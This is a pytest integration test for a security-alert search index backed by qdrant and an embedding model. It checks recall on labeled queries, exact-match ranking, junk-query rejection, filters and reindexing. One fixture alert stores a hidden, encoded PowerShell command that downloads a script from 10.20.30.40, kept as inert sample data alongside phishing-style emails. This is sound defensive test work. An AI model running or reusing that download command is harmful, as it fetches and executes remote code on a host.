"""Retrieval regression: a labeled corpus indexed into a REAL qdrant with the REAL embedding
model, queried through the public search functions.

This is the test that says whether search actually works, as opposed to whether the plumbing
around it is wired correctly (everything else in this directory mocks qdrant and the model).
It needs the dev qdrant and the embedding model (downloaded on first run and cached under the
pytest cache directory so the per-test data directory reset does not throw it away).
"""

import os
import uuid

import pytest

from saq.configuration.config import get_config
from saq.constants import F_COMMAND_LINE, F_FILE, F_IPV4
from saq.database.model import Alert, Comment, User
from saq.database.pool import get_db
from saq.database.util.alert import ALERT
from saq.modules.command_line import CommandLineAnalysis
from saq.modules.email.rfc822 import EmailAnalysis
from saq.modules.file_analysis.qrcode import QRCodeAnalysis
from saq.qdrant_client import get_qdrant_client
from saq.search import index
from saq.search.query import search_alerts, similar_alerts
from saq.search.types import TIER_EXACT, SearchRequest
from tests.saq.helpers import create_root_analysis

pytestmark = [pytest.mark.integration, pytest.mark.slow]

SHA256_HEX = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"


def _qdrant_reachable() -> bool:
    try:
        get_qdrant_client(timeout=3).get_collections()
        return True
    except Exception:
        return False


@pytest.fixture(scope="module")
def model(request):
    """The real embedding model, cached across runs in the pytest cache directory."""
    if not _qdrant_reachable():
        pytest.skip("qdrant is not reachable")

    from saq.search.model import clear_model_cache, load_model

    cache_dir = str(request.config.cache.mkdir("search-models"))
    original = get_config().search.model_cache_dir
    get_config().search.model_cache_dir = cache_dir
    try:
        try:
            yield load_model()
        except Exception as e:
            pytest.skip(f"embedding model unavailable: {e}")
    finally:
        get_config().search.model_cache_dir = original
        clear_model_cache()


@pytest.fixture
def collection(monkeypatch):
    prefix = f"ace3-test-{uuid.uuid4().hex[:8]}"
    monkeypatch.setattr(get_config().qdrant, "collection_prefix", prefix)
    yield prefix
    client = get_qdrant_client()
    name = index.collection_name()
    if client.collection_exists(collection_name=name):
        client.delete_collection(collection_name=name)


def _user_id() -> int:
    return get_db().query(User.id).filter(User.username == "unittest").scalar()


def _alert(description: str, *, alert_type="phish", build=None, comments=(), tags=()) -> Alert:
    root = create_root_analysis(uuid=str(uuid.uuid4()), desc=description, alert_type=alert_type)
    root.initialize_storage()
    for tag in tags:
        root.add_tag(tag)
    if build is not None:
        build(root)
    root.save()
    alert = ALERT(root)
    db = get_db()
    for text in comments:
        db.add(Comment(uuid=alert.uuid, user_id=_user_id(), comment=text))
    db.commit()
    return alert


def _email(root, *, sender: str, recipient: str, subject: str, body: str):
    eml_path = root.create_file_path("email.rfc822")
    with open(eml_path, "w") as fp:
        fp.write(f"From: {sender}\nTo: {recipient}\nSubject: {subject}\n\n{body}\n")
    email_file = root.add_file_observable(eml_path)
    analysis = EmailAnalysis()
    email_file.add_analysis(analysis)
    analysis.details["email"] = {"from": sender, "to": [recipient], "subject": subject, "decoded_subject": subject, "headers": []}
    body_path = root.create_file_path("email.rfc822.unknown_text_plain_000")
    with open(body_path, "w") as fp:
        fp.write(body)
    analysis.add_file_observable(body_path)
    root.add_observable_by_spec("email_address", sender)
    root.add_observable_by_spec("email_address", recipient)


def _command_line(root, command: str, ip: str):
    observable = root.add_observable_by_spec(F_COMMAND_LINE, command)
    observable.add_analysis(CommandLineAnalysis())
    root.add_observable_by_spec(F_IPV4, ip)


def _qr(root, text: str):
    image_path = root.create_file_path("qr.png")
    with open(image_path, "wb") as fp:
        fp.write(b"\x89PNG" + os.urandom(16))
    image = root.add_file_observable(image_path)
    analysis = QRCodeAnalysis()
    image.add_analysis(analysis)
    analysis.extracted_text = text


@pytest.fixture
def corpus(model, collection):
    client = get_qdrant_client()
    alerts = {
        "docusign": _alert("Suspicious email - DocuSign invoice", build=lambda r: _email(
            r, sender="billing@docusign-invoices.example", recipient="bob@example.com",
            subject="Your DocuSign invoice is ready",
            body="Please review and sign the attached invoice before the end of the day. Click the link to view the document.")),
        "powershell": _alert("EDR - encoded PowerShell download", alert_type="edr", build=lambda r: _command_line(
            r, "powershell.exe -nop -w hidden -enc SQBFAFgA (New-Object Net.WebClient).DownloadString('http://10.20.30.40/a.ps1')", "10.20.30.40")),
        "malware": _alert("Sandbox - malicious executable detonated", alert_type="sandbox", build=lambda r: (
            r.add_observable_by_spec("sha256", SHA256_HEX), r.add_detection_point("file matched yara rule Win32_Trojan_Generic"))),
        "newsletter": _alert("Suspicious email - HR newsletter", build=lambda r: _email(
            r, sender="hr@example.com", recipient="all@example.com", subject="September wellness newsletter",
            body="Join us for the quarterly wellness fair with yoga sessions and healthy snacks in the cafeteria.")),
        "vpn": _alert("VPN - brute force from external ip", alert_type="vpn", tags=("credential-harvest",),
                      build=lambda r: (r.add_observable_by_spec(F_IPV4, "203.0.113.7"), r.add_detection_point("200 failed vpn logins from 203.0.113.7 in ten minutes"))),
        "qr": _alert("Suspicious email - QR code", build=lambda r: _qr(r, "https://mfa-reset.example/login?user=bob")),
        "vendor": _alert("Suspicious email - marketing blast", comments=("confirmed false positive, this is the vendor mailer we whitelisted last month",)),
        "docusign2": _alert("Suspicious email - DocuSign invoice", build=lambda r: _email(
            r, sender="noreply@dokusign-secure.example", recipient="alice@example.com",
            subject="Your DocuSign invoice is ready",
            body="An invoice has been shared with you. Review and sign the document at the link below.")),
    }
    for alert in alerts.values():
        result = index.index_alert(alert.uuid, client=client, model=model)
        assert not result.skipped and result.point_count > 0, result

    return {name: alert.uuid for name, alert in alerts.items()}


LABELED_QUERIES = [
    # (query, alerts expected in the top 3, must an exact match be rank 1)
    ("docusign invoice phishing", {"docusign", "docusign2"}, False),
    ("bob@example.com", {"docusign"}, True),
    ("10.20.30.40", {"powershell"}, True),
    (SHA256_HEX, {"malware"}, True),
    ("credential-harvest", {"vpn"}, True),
    ("powershell encoded download", {"powershell"}, False),
    ("qr code mfa reset", {"qr"}, False),
    ("vendor mailer false positive", {"vendor"}, False),
    ("brute force vpn logins", {"vpn"}, False),
]


def _report(query, response, uuid_to_name):
    return f"{query!r} -> " + ", ".join(f"{r.rank}:{uuid_to_name.get(r.alert_uuid, r.alert_uuid)}[{r.tier}]" for r in response.results)


def test_labeled_queries(corpus, model):
    uuid_to_name = {alert_uuid: name for name, alert_uuid in corpus.items()}
    failures = []
    for query, expected, exact in LABELED_QUERIES:
        response = search_alerts(SearchRequest(query=query, limit=3), model=model)
        top = [uuid_to_name.get(r.alert_uuid) for r in response.results]
        line = _report(query, response, uuid_to_name)
        if not expected.issubset(set(top)):
            failures.append(f"recall@3 miss: {line}")
        if exact and (not response.results or response.results[0].tier != TIER_EXACT or top[0] not in expected):
            failures.append(f"exact match not first: {line}")

    assert not failures, "\n".join(failures)


JUNK_QUERIES = ["asdfghjkl", "the", "banana smoothie recipe", "xyzzy plugh"]


def test_junk_queries_return_nothing(corpus, model):
    """The dense lane always has a nearest neighbour; the floor is what keeps a nonsense query
    from returning the whole corpus as "strong" matches."""
    for junk in JUNK_QUERIES:
        response = search_alerts(SearchRequest(query=junk, limit=5), model=model)
        assert response.total == 0, f"{junk!r} matched {[(r.alert_uuid, r.tier, r.dense_score, r.sparse_score) for r in response.results]}"


def test_tiers_reflect_evidence(corpus, model):
    uuid_to_name = {alert_uuid: name for name, alert_uuid in corpus.items()}
    response = search_alerts(SearchRequest(query="docusign invoice phishing", limit=5), model=model)
    top = response.results[0]
    assert uuid_to_name[top.alert_uuid] in ("docusign", "docusign2")
    assert top.tier == "strong" and top.dense_score >= get_config().search.score_threshold
    assert all(r.tier != TIER_EXACT for r in response.results)

    response = search_alerts(SearchRequest(query="10.20.30.40", limit=5), model=model)
    assert response.results[0].tier == TIER_EXACT


def test_exact_hits_carry_lexical_evidence(corpus, model):
    response = search_alerts(SearchRequest(query="203.0.113.7", limit=3), model=model)
    assert response.results[0].alert_uuid == corpus["vpn"]
    hits = response.results[0].hits
    assert hits[0].lane == "lexical" and hits[0].text == "203.0.113.7"


def test_filters_narrow_both_lanes(corpus, model):
    from saq.search.types import SearchFilters

    response = search_alerts(SearchRequest(query="docusign invoice", limit=5, filters=SearchFilters(alert_types=("edr",))), model=model)
    assert all(r.alert_uuid == corpus["powershell"] for r in response.results)

    response = search_alerts(SearchRequest(query="docusign invoice", limit=5, filters=SearchFilters(alert_types=("edr",), alert_types_inverted=True)), model=model)
    assert {corpus["docusign"], corpus["docusign2"]}.issubset(set(response.alert_uuids))


def test_similar_alerts_finds_the_near_duplicate(corpus, model):
    response = similar_alerts(corpus["docusign"], limit=3)
    assert corpus["docusign"] not in response.alert_uuids
    assert corpus["docusign2"] in response.alert_uuids[:3], response.alert_uuids


def test_reindex_is_idempotent_and_payload_updates_stick(corpus, model):
    client = get_qdrant_client()
    name = index.collection_name()
    before = client.count(collection_name=name, exact=True).count

    result = index.index_alert(corpus["docusign"], client=client, model=model)
    assert client.count(collection_name=name, exact=True).count == before
    assert result.point_count > 0

    get_db().execute(Alert.__table__.update().where(Alert.uuid == corpus["docusign"]).values(disposition="DELIVERY"))
    get_db().commit()
    assert index.update_alert_payload(corpus["docusign"], client=client)
    points, _ = client.scroll(collection_name=name, scroll_filter=index.root_uuid_filter(corpus["docusign"]), limit=5, with_payload=True)
    assert all(p.payload[index.FIELD_DISPOSITION] == "DELIVERY" for p in points)

    from saq.search.types import SearchFilters
    response = search_alerts(SearchRequest(query="docusign invoice", limit=5, filters=SearchFilters(dispositions=("DELIVERY",))), model=model)
    assert response.alert_uuids == [corpus["docusign"]]

    index.delete_alert(corpus["docusign"], client=client)
    assert client.count(collection_name=name, exact=True).count == before - result.point_count
